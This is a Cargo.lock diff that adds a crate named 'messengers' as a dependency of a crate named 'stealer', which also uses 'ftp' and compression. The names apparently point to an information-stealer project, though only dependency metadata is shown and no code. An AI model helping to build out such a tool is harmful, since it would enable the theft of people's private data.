@@ -18,6 +18,14 @@ dependencies = [
 ]
 
 [[package]]
+name = "messengers"
+version = "0.1.0"
+dependencies = [
+ "tasks",
+ "utils",
+]
+
+[[package]]
 name = "miniz_oxide"
 version = "0.8.8"
 source = "registry+https://github.com/rust-lang/crates.io-index"
@@ -49,6 +57,7 @@ name = "stealer"
 version = "0.1.0"
 dependencies = [
  "ftp",
+ "messengers",
  "miniz_oxide",
  "tasks",
  "utils",
